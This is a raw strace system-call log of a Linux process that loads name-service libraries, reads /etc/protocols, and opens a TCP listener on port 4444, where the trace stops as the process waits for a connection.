11892 07:39:45.221680 open("/etc/nsswitch.conf", O_RDONLY) = 6
11892 07:39:45.221729 fstat64(6, {st_mode=S_IFREG|0644, st_size=475, ...}) = 0
11892 07:39:45.221749 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7f7a000
11892 07:39:45.221764 read(6, "# /etc/nsswitch.conf\n#\n# Example configuration of GNU Name Service Switch functionality.\n# If you have the `glibc-doc-reference\' and `info\' packages installed, try:\n# `info libc \"Name Service Switch\"\' for information about this file.\n\npasswd:         compat\ngroup:          compat\nshadow:         compat\n\nhosts:          files dns\nnetworks:       files\n\nprotocols:      db files\nservices:       db files\nethers:         db files\nrpc:            db files\n\nnetgroup:       nis\n", 4096) = 475
11892 07:39:45.221815 read(6, "", 4096) = 0
11892 07:39:45.221825 close(6)          = 0
11892 07:39:45.221835 munmap(0xb7f7a000, 4096) = 0
11892 07:39:45.221863 open("/etc/ld.so.cache", O_RDONLY) = 6
11892 07:39:45.221881 fstat64(6, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
11892 07:39:45.221898 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 6, 0) = 0xb7d81000
11892 07:39:45.221910 close(6)          = 0
11892 07:39:45.221922 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
11892 07:39:45.221940 open("/lib/tls/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
11892 07:39:45.221955 stat64("/lib/tls/i686/sse2/cmov", 0xbfeb634c) = -1 ENOENT (No such file or directory)
11892 07:39:45.221969 open("/lib/tls/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
11892 07:39:45.221982 stat64("/lib/tls/i686/sse2", 0xbfeb634c) = -1 ENOENT (No such file or directory)
11892 07:39:45.221993 open("/lib/tls/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
11892 07:39:45.222006 stat64("/lib/tls/i686/cmov", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
11892 07:39:45.222024 open("/lib/tls/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
11892 07:39:45.222037 stat64("/lib/tls/i686", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
11892 07:39:45.222054 open("/lib/tls/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
11892 07:39:45.222066 stat64("/lib/tls/sse2/cmov", 0xbfeb634c) = -1 ENOENT (No such file or directory)
11892 07:39:45.222077 open("/lib/tls/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
11892 07:39:45.222090 stat64("/lib/tls/sse2", 0xbfeb634c) = -1 ENOENT (No such file or directory)
11892 07:39:45.222101 open("/lib/tls/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
11892 07:39:45.222113 stat64("/lib/tls/cmov", 0xbfeb634c) = -1 ENOENT (No such file or directory)
11892 07:39:45.222133 open("/lib/tls/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
11892 07:39:45.222146 stat64("/lib/tls", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
11892 07:39:45.222163 open("/lib/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
11892 07:39:45.222176 stat64("/lib/i686/sse2/cmov", 0xbfeb634c) = -1 ENOENT (No such file or directory)
11892 07:39:45.222187 open("/lib/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
11892 07:39:45.222199 stat64("/lib/i686/sse2", 0xbfeb634c) = -1 ENOENT (No such file or directory)
11892 07:39:45.222210 open("/lib/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
11892 07:39:45.222222 stat64("/lib/i686/cmov", 0xbfeb634c) = -1 ENOENT (No such file or directory)
11892 07:39:45.222233 open("/lib/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
11892 07:39:45.222244 stat64("/lib/i686", 0xbfeb634c) = -1 ENOENT (No such file or directory)
11892 07:39:45.222255 open("/lib/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
11892 07:39:45.222267 stat64("/lib/sse2/cmov", 0xbfeb634c) = -1 ENOENT (No such file or directory)
11892 07:39:45.222278 open("/lib/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
11892 07:39:45.222289 stat64("/lib/sse2", 0xbfeb634c) = -1 ENOENT (No such file or directory)
11892 07:39:45.222300 open("/lib/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
11892 07:39:45.222312 stat64("/lib/cmov", 0xbfeb634c) = -1 ENOENT (No such file or directory)
11892 07:39:45.222322 open("/lib/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
11892 07:39:45.222333 stat64("/lib", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
11892 07:39:45.222350 open("/usr/lib/tls/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
11892 07:39:45.222363 stat64("/usr/lib/tls/i686/sse2/cmov", 0xbfeb634c) = -1 ENOENT (No such file or directory)
11892 07:39:45.222375 open("/usr/lib/tls/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
11892 07:39:45.222388 stat64("/usr/lib/tls/i686/sse2", 0xbfeb634c) = -1 ENOENT (No such file or directory)
11892 07:39:45.222399 open("/usr/lib/tls/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
11892 07:39:45.222416 stat64("/usr/lib/tls/i686/cmov", 0xbfeb634c) = -1 ENOENT (No such file or directory)
11892 07:39:45.222428 open("/usr/lib/tls/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
11892 07:39:45.222440 stat64("/usr/lib/tls/i686", 0xbfeb634c) = -1 ENOENT (No such file or directory)
11892 07:39:45.222451 open("/usr/lib/tls/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
11892 07:39:45.222464 stat64("/usr/lib/tls/sse2/cmov", 0xbfeb634c) = -1 ENOENT (No such file or directory)
11892 07:39:45.222475 open("/usr/lib/tls/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
11892 07:39:45.222488 stat64("/usr/lib/tls/sse2", 0xbfeb634c) = -1 ENOENT (No such file or directory)
11892 07:39:45.222499 open("/usr/lib/tls/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
11892 07:39:45.222511 stat64("/usr/lib/tls/cmov", 0xbfeb634c) = -1 ENOENT (No such file or directory)
11892 07:39:45.222522 open("/usr/lib/tls/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
11892 07:39:45.222534 stat64("/usr/lib/tls", 0xbfeb634c) = -1 ENOENT (No such file or directory)
11892 07:39:45.222545 open("/usr/lib/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
11892 07:39:45.222558 stat64("/usr/lib/i686/sse2/cmov", 0xbfeb634c) = -1 ENOENT (No such file or directory)
11892 07:39:45.222570 open("/usr/lib/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
11892 07:39:45.222582 stat64("/usr/lib/i686/sse2", 0xbfeb634c) = -1 ENOENT (No such file or directory)
11892 07:39:45.222594 open("/usr/lib/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
11892 07:39:45.222607 stat64("/usr/lib/i686/cmov", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
11892 07:39:45.222630 open("/usr/lib/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
11892 07:39:45.222644 stat64("/usr/lib/i686", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
11892 07:39:45.222661 open("/usr/lib/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
11892 07:39:45.222673 stat64("/usr/lib/sse2/cmov", 0xbfeb634c) = -1 ENOENT (No such file or directory)
11892 07:39:45.222685 open("/usr/lib/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
11892 07:39:45.222697 stat64("/usr/lib/sse2", 0xbfeb634c) = -1 ENOENT (No such file or directory)
11892 07:39:45.222707 open("/usr/lib/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
11892 07:39:45.222720 stat64("/usr/lib/cmov", 0xbfeb634c) = -1 ENOENT (No such file or directory)
11892 07:39:45.222731 open("/usr/lib/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
11892 07:39:45.222742 stat64("/usr/lib", {st_mode=S_IFDIR|0755, st_size=32768, ...}) = 0
11892 07:39:45.222759 open("/lib/i486-linux-gnu/tls/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
11892 07:39:45.222773 stat64("/lib/i486-linux-gnu/tls/i686/sse2/cmov", 0xbfeb634c) = -1 ENOENT (No such file or directory)
11892 07:39:45.222786 open("/lib/i486-linux-gnu/tls/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
11892 07:39:45.222799 stat64("/lib/i486-linux-gnu/tls/i686/sse2", 0xbfeb634c) = -1 ENOENT (No such file or directory)
11892 07:39:45.222811 open("/lib/i486-linux-gnu/tls/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
11892 07:39:45.222824 stat64("/lib/i486-linux-gnu/tls/i686/cmov", 0xbfeb634c) = -1 ENOENT (No such file or directory)
11892 07:39:45.222837 open("/lib/i486-linux-gnu/tls/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
11892 07:39:45.222849 stat64("/lib/i486-linux-gnu/tls/i686", 0xbfeb634c) = -1 ENOENT (No such file or directory)
11892 07:39:45.222861 open("/lib/i486-linux-gnu/tls/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
11892 07:39:45.222874 stat64("/lib/i486-linux-gnu/tls/sse2/cmov", 0xbfeb634c) = -1 ENOENT (No such file or directory)
11892 07:39:45.222890 open("/lib/i486-linux-gnu/tls/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
11892 07:39:45.222902 stat64("/lib/i486-linux-gnu/tls/sse2", 0xbfeb634c) = -1 ENOENT (No such file or directory)
11892 07:39:45.222914 open("/lib/i486-linux-gnu/tls/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
11892 07:39:45.222927 stat64("/lib/i486-linux-gnu/tls/cmov", 0xbfeb634c) = -1 ENOENT (No such file or directory)
11892 07:39:45.222939 open("/lib/i486-linux-gnu/tls/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
11892 07:39:45.222951 stat64("/lib/i486-linux-gnu/tls", 0xbfeb634c) = -1 ENOENT (No such file or directory)
11892 07:39:45.222963 open("/lib/i486-linux-gnu/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
11892 07:39:45.222976 stat64("/lib/i486-linux-gnu/i686/sse2/cmov", 0xbfeb634c) = -1 ENOENT (No such file or directory)
11892 07:39:45.222989 open("/lib/i486-linux-gnu/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
11892 07:39:45.223002 stat64("/lib/i486-linux-gnu/i686/sse2", 0xbfeb634c) = -1 ENOENT (No such file or directory)
11892 07:39:45.223013 open("/lib/i486-linux-gnu/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
11892 07:39:45.223027 stat64("/lib/i486-linux-gnu/i686/cmov", 0xbfeb634c) = -1 ENOENT (No such file or directory)
11892 07:39:45.223038 open("/lib/i486-linux-gnu/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
11892 07:39:45.223051 stat64("/lib/i486-linux-gnu/i686", 0xbfeb634c) = -1 ENOENT (No such file or directory)
11892 07:39:45.223063 open("/lib/i486-linux-gnu/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
11892 07:39:45.223076 stat64("/lib/i486-linux-gnu/sse2/cmov", 0xbfeb634c) = -1 ENOENT (No such file or directory)
11892 07:39:45.223088 open("/lib/i486-linux-gnu/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
11892 07:39:45.223100 stat64("/lib/i486-linux-gnu/sse2", 0xbfeb634c) = -1 ENOENT (No such file or directory)
11892 07:39:45.223112 open("/lib/i486-linux-gnu/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
11892 07:39:45.223131 stat64("/lib/i486-linux-gnu/cmov", 0xbfeb634c) = -1 ENOENT (No such file or directory)
11892 07:39:45.223171 open("/lib/i486-linux-gnu/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
11892 07:39:45.223198 stat64("/lib/i486-linux-gnu", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
11892 07:39:45.223215 open("/usr/lib/i486-linux-gnu/tls/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
11892 07:39:45.223229 stat64("/usr/lib/i486-linux-gnu/tls/i686/sse2/cmov", 0xbfeb634c) = -1 ENOENT (No such file or directory)
11892 07:39:45.223242 open("/usr/lib/i486-linux-gnu/tls/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
11892 07:39:45.223256 stat64("/usr/lib/i486-linux-gnu/tls/i686/sse2", 0xbfeb634c) = -1 ENOENT (No such file or directory)
11892 07:39:45.223268 open("/usr/lib/i486-linux-gnu/tls/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
11892 07:39:45.223282 stat64("/usr/lib/i486-linux-gnu/tls/i686/cmov", 0xbfeb634c) = -1 ENOENT (No such file or directory)
11892 07:39:45.223294 open("/usr/lib/i486-linux-gnu/tls/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
11892 07:39:45.223307 stat64("/usr/lib/i486-linux-gnu/tls/i686", 0xbfeb634c) = -1 ENOENT (No such file or directory)
11892 07:39:45.223320 open("/usr/lib/i486-linux-gnu/tls/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
11892 07:39:45.223333 stat64("/usr/lib/i486-linux-gnu/tls/sse2/cmov", 0xbfeb634c) = -1 ENOENT (No such file or directory)
11892 07:39:45.223346 open("/usr/lib/i486-linux-gnu/tls/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
11892 07:39:45.223359 stat64("/usr/lib/i486-linux-gnu/tls/sse2", 0xbfeb634c) = -1 ENOENT (No such file or directory)
11892 07:39:45.223375 open("/usr/lib/i486-linux-gnu/tls/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
11892 07:39:45.223388 stat64("/usr/lib/i486-linux-gnu/tls/cmov", 0xbfeb634c) = -1 ENOENT (No such file or directory)
11892 07:39:45.223400 open("/usr/lib/i486-linux-gnu/tls/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
11892 07:39:45.223413 stat64("/usr/lib/i486-linux-gnu/tls", 0xbfeb634c) = -1 ENOENT (No such file or directory)
11892 07:39:45.223425 open("/usr/lib/i486-linux-gnu/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
11892 07:39:45.223438 stat64("/usr/lib/i486-linux-gnu/i686/sse2/cmov", 0xbfeb634c) = -1 ENOENT (No such file or directory)
11892 07:39:45.223451 open("/usr/lib/i486-linux-gnu/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
11892 07:39:45.223464 stat64("/usr/lib/i486-linux-gnu/i686/sse2", 0xbfeb634c) = -1 ENOENT (No such file or directory)
11892 07:39:45.223476 open("/usr/lib/i486-linux-gnu/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
11892 07:39:45.223489 stat64("/usr/lib/i486-linux-gnu/i686/cmov", 0xbfeb634c) = -1 ENOENT (No such file or directory)
11892 07:39:45.223501 open("/usr/lib/i486-linux-gnu/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
11892 07:39:45.223514 stat64("/usr/lib/i486-linux-gnu/i686", 0xbfeb634c) = -1 ENOENT (No such file or directory)
11892 07:39:45.223526 open("/usr/lib/i486-linux-gnu/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
11892 07:39:45.223539 stat64("/usr/lib/i486-linux-gnu/sse2/cmov", 0xbfeb634c) = -1 ENOENT (No such file or directory)
11892 07:39:45.223552 open("/usr/lib/i486-linux-gnu/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
11892 07:39:45.223564 stat64("/usr/lib/i486-linux-gnu/sse2", 0xbfeb634c) = -1 ENOENT (No such file or directory)
11892 07:39:45.223576 open("/usr/lib/i486-linux-gnu/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
11892 07:39:45.223589 stat64("/usr/lib/i486-linux-gnu/cmov", 0xbfeb634c) = -1 ENOENT (No such file or directory)
11892 07:39:45.223601 open("/usr/lib/i486-linux-gnu/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
11892 07:39:45.223613 stat64("/usr/lib/i486-linux-gnu", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
11892 07:39:45.223641 munmap(0xb7d81000, 29913) = 0
11892 07:39:45.223662 open("/etc/ld.so.cache", O_RDONLY) = 6
11892 07:39:45.223675 fstat64(6, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
11892 07:39:45.223691 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 6, 0) = 0xb7d81000
11892 07:39:45.223702 close(6)          = 0
11892 07:39:45.223713 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
11892 07:39:45.223727 open("/lib/tls/i686/cmov/libnss_files.so.2", O_RDONLY) = 6
11892 07:39:45.223742 read(6, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\340\30\0\0004\0\0\0\254\221\0\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\330\206\0\0\330\206\0\0\330\206\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\240\213\0\0\240\213\0\0\5\0\0\0\0\20\0\0\1\0\0\0\350\216\0\0\350\236\0\0\350\236\0\0\314\1\0\0\260\3\0\0\6\0\0\0\0\20\0\0\2\0\0\0\374\216\0\0\374\236\0\0\374\236\0\0\340\0\0\0\340\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\350\216\0\0\350\236\0\0\350\236\0\0\f\1\0\0\f\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0k\0\0\0.\0\0\0\20\0\0\0\t\0\0\0\"F\340\24\240\240\245\1\31\10\200\20\203\6\212\10\0\0\222@]\1(\nx\10 \"\220\200\20,\5\1\204\4)!\0224\0\24\0\31\0\0\2\2\210@\0\200@0\210\201@@\200\0B\0\6\300.\0\0\0\0\0\0\0\0\0\0\0/\0\0\0000\0\0\0001\0\0\0002\0\0\0003\0\0\0\0\0\0\0004\0\0\0\0\0\0\0005\0\0\0007\0\0\0008\0\0\0\0\0\0\0:\0\0\0\0\0\0\0;\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0", 512) = 512
11892 07:39:45.223837 fstat64(6, {st_mode=S_IFREG|0644, st_size=38412, ...}) = 0
11892 07:39:45.223859 mmap2(NULL, 41624, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 6, 0) = 0xb7d76000
11892 07:39:45.223872 mmap2(0xb7d7f000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 6, 0x8) = 0xb7d7f000
11892 07:39:45.223888 close(6)          = 0
11892 07:39:45.223912 munmap(0xb7d81000, 29913) = 0
11892 07:39:45.223929 open("/etc/protocols", O_RDONLY|0x80000 /* O_??? */) = 6
11892 07:39:45.223945 fcntl64(6, F_GETFD) = 0x1 (flags FD_CLOEXEC)
11892 07:39:45.223961 fstat64(6, {st_mode=S_IFREG|0644, st_size=2510, ...}) = 0
11892 07:39:45.223978 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7d88000
11892 07:39:45.223989 read(6, "# Internet (IP) protocols\n#\n# Updated from http://www.iana.org/assignments/protocol-numbers and other\n# sources.\n# New protocols will be added on request if they have been officially\n# assigned by IANA and are not historical.\n# If you need a huge list of used numbers please install the nmap package.\n\nip\t0\tIP\t\t# internet protocol, pseudo protocol number\n#hopopt\t0\tHOPOPT\t\t# IPv6 Hop-by-Hop Option [RFC1883]\nicmp\t1\tICMP\t\t# internet control message protocol\nigmp\t2\tIGMP\t\t# Internet Group Management\nggp\t3\tGGP\t\t# gateway-gateway protocol\nipencap\t4\tIP-ENCAP\t# IP encapsulated in IP (officially ``IP\'\')\nst\t5\tST\t\t# ST datagram mode\ntcp\t6\tTCP\t\t# transmission control protocol\negp\t8\tEGP\t\t# exterior gateway protocol\nigp\t9\tIGP\t\t# any private interior gateway (Cisco)\npup\t12\tPUP\t\t# PARC universal packet protocol\nudp\t17\tUDP\t\t# user datagram protocol\nhmp\t20\tHMP\t\t# host monitoring protocol\nxns-idp\t22\tXNS-IDP\t\t# Xerox NS IDP\nrdp\t27\tRDP\t\t# \"reliable datagram\" protocol\niso-tp4\t29\tISO-TP4\t\t# ISO Transport Protocol class 4 [RFC905]\nxtp\t36\tXTP\t\t# Xpress Transfer Protocol\nddp\t37\tDDP\t\t# Datagram Delivery Protocol\nidpr-cmtp 38\tIDPR-CMTP\t# IDPR Control Message Transport\nipv6\t41\tIPv6\t\t# Internet Protocol, version 6\nipv6-route 43\tIPv6-Route\t# Routing Header for IPv6\nipv6-frag 44\tIPv6-Frag\t# Fragment Header for IPv6\nidrp\t45\tIDRP\t\t# Inter-Domain Routing Protocol\nrsvp\t46\tRSVP\t\t# Reservation Protocol\ngre\t47\tGRE\t\t# General Routing Encapsulation\nesp\t50\tIPSEC-ESP\t# Encap Security Payload [RFC2406]\nah\t51\tIPSEC-AH\t# Authentication Header [RFC2402]\nskip\t57\tSKIP\t\t# SKIP\nipv6-icmp 58\tIPv6-ICMP\t# ICMP for IPv6\nipv6-nonxt 59\tIPv6-NoNxt\t# No Next Header for IPv6\nipv6-opts 60\tIPv6-Opts\t# Destination Options for IPv6\nrspf\t73\tRSPF CPHB\t# Radio Shortest Path First (officially CPHB)\nvmtp\t81\tVMTP\t\t# Versatile Message Transport\neigrp\t88\tEIGRP\t\t# Enhanced Interior Routing Protocol (Cisco)\nospf\t89\tOSPFIGP\t\t# Open Shortest Path First IGP\nax.25\t93\tAX.25\t\t# AX.25 frames\nipip\t94\tIPIP\t\t# IP-within-IP Encapsulation Protocol\netherip\t97\tETHERIP\t\t# Ethernet-within-IP Encapsulation [RFC3378]\nencap\t98\tENCAP\t\t# Yet Another IP encapsulation [RFC1241]\n#\t99\t\t\t# any private encryption scheme\npim\t103\tPIM\t\t# Protocol Independent Multicast\nipcomp\t108\tIPCOMP\t\t# IP Payload Compression Protocol\nvrrp\t112\tVRRP\t\t# Virtual Router Redundancy Protocol\nl2tp\t115\tL2TP\t\t# Layer Two Tunneling Protocol [RFC2661]\nisis\t124\tISIS\t\t# IS-IS over IPv4\nsctp\t132\tSCTP\t\t# Stream Control Transmission Protocol\nfc\t133\tFC\t\t# Fibre Channel\nudplite\t136\tUDPLite\t\t# UDP-Lite\n\n", 4096) = 2510
11892 07:39:45.224184 close(6)          = 0
11892 07:39:45.224195 munmap(0xb7d88000, 4096) = 0
11892 07:39:45.224214 open("/etc/protocols", O_RDONLY|0x80000 /* O_??? */) = 6
11892 07:39:45.224228 fstat64(6, {st_mode=S_IFREG|0644, st_size=2510, ...}) = 0
11892 07:39:45.224245 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7d88000
11892 07:39:45.224256 read(6, "# Internet (IP) protocols\n#\n# Updated from http://www.iana.org/assignments/protocol-numbers and other\n# sources.\n# New protocols will be added on request if they have been officially\n# assigned by IANA and are not historical.\n# If you need a huge list of used numbers please install the nmap package.\n\nip\t0\tIP\t\t# internet protocol, pseudo protocol number\n#hopopt\t0\tHOPOPT\t\t# IPv6 Hop-by-Hop Option [RFC1883]\nicmp\t1\tICMP\t\t# internet control message protocol\nigmp\t2\tIGMP\t\t# Internet Group Management\nggp\t3\tGGP\t\t# gateway-gateway protocol\nipencap\t4\tIP-ENCAP\t# IP encapsulated in IP (officially ``IP\'\')\nst\t5\tST\t\t# ST datagram mode\ntcp\t6\tTCP\t\t# transmission control protocol\negp\t8\tEGP\t\t# exterior gateway protocol\nigp\t9\tIGP\t\t# any private interior gateway (Cisco)\npup\t12\tPUP\t\t# PARC universal packet protocol\nudp\t17\tUDP\t\t# user datagram protocol\nhmp\t20\tHMP\t\t# host monitoring protocol\nxns-idp\t22\tXNS-IDP\t\t# Xerox NS IDP\nrdp\t27\tRDP\t\t# \"reliable datagram\" protocol\niso-tp4\t29\tISO-TP4\t\t# ISO Transport Protocol class 4 [RFC905]\nxtp\t36\tXTP\t\t# Xpress Transfer Protocol\nddp\t37\tDDP\t\t# Datagram Delivery Protocol\nidpr-cmtp 38\tIDPR-CMTP\t# IDPR Control Message Transport\nipv6\t41\tIPv6\t\t# Internet Protocol, version 6\nipv6-route 43\tIPv6-Route\t# Routing Header for IPv6\nipv6-frag 44\tIPv6-Frag\t# Fragment Header for IPv6\nidrp\t45\tIDRP\t\t# Inter-Domain Routing Protocol\nrsvp\t46\tRSVP\t\t# Reservation Protocol\ngre\t47\tGRE\t\t# General Routing Encapsulation\nesp\t50\tIPSEC-ESP\t# Encap Security Payload [RFC2406]\nah\t51\tIPSEC-AH\t# Authentication Header [RFC2402]\nskip\t57\tSKIP\t\t# SKIP\nipv6-icmp 58\tIPv6-ICMP\t# ICMP for IPv6\nipv6-nonxt 59\tIPv6-NoNxt\t# No Next Header for IPv6\nipv6-opts 60\tIPv6-Opts\t# Destination Options for IPv6\nrspf\t73\tRSPF CPHB\t# Radio Shortest Path First (officially CPHB)\nvmtp\t81\tVMTP\t\t# Versatile Message Transport\neigrp\t88\tEIGRP\t\t# Enhanced Interior Routing Protocol (Cisco)\nospf\t89\tOSPFIGP\t\t# Open Shortest Path First IGP\nax.25\t93\tAX.25\t\t# AX.25 frames\nipip\t94\tIPIP\t\t# IP-within-IP Encapsulation Protocol\netherip\t97\tETHERIP\t\t# Ethernet-within-IP Encapsulation [RFC3378]\nencap\t98\tENCAP\t\t# Yet Another IP encapsulation [RFC1241]\n#\t99\t\t\t# any private encryption scheme\npim\t103\tPIM\t\t# Protocol Independent Multicast\nipcomp\t108\tIPCOMP\t\t# IP Payload Compression Protocol\nvrrp\t112\tVRRP\t\t# Virtual Router Redundancy Protocol\nl2tp\t115\tL2TP\t\t# Layer Two Tunneling Protocol [RFC2661]\nisis\t124\tISIS\t\t# IS-IS over IPv4\nsctp\t132\tSCTP\t\t# Stream Control Transmission Protocol\nfc\t133\tFC\t\t# Fibre Channel\nudplite\t136\tUDPLite\t\t# UDP-Lite\n\n", 4096) = 2510
11892 07:39:45.224436 close(6)          = 0
11892 07:39:45.224445 munmap(0xb7d88000, 4096) = 0
11892 07:39:45.224473 socket(PF_INET, SOCK_STREAM, IPPROTO_TCP) = 6
11892 07:39:45.224494 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfeb6858) = -1 EINVAL (Invalid argument)
11892 07:39:45.224508 _llseek(6, 0, 0xbfeb68a0, SEEK_CUR) = -1 ESPIPE (Illegal seek)
11892 07:39:45.224520 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfeb6858) = -1 EINVAL (Invalid argument)
11892 07:39:45.224531 _llseek(6, 0, 0xbfeb68a0, SEEK_CUR) = -1 ESPIPE (Illegal seek)
11892 07:39:45.224541 fcntl64(6, F_SETFD, FD_CLOEXEC) = 0
11892 07:39:45.224596 setsockopt(6, SOL_SOCKET, SO_REUSEADDR, [1], 4) = 0
11892 07:39:45.224640 bind(6, {sa_family=AF_INET, sin_port=htons(4444), sin_addr=inet_addr("0.0.0.0")}, 16) = 0
11892 07:39:45.224666 listen(6, 5)      = 0
11892 07:39:45.224719 accept(6,  <unfinished ...>
11891 07:39:45.260630 exit_group(0)     = ?
11889 07:39:45.260630 <... waitpid resumed> [{WIFEXITED(s) && WEXITSTATUS(s) == 0}], 0) = 11891
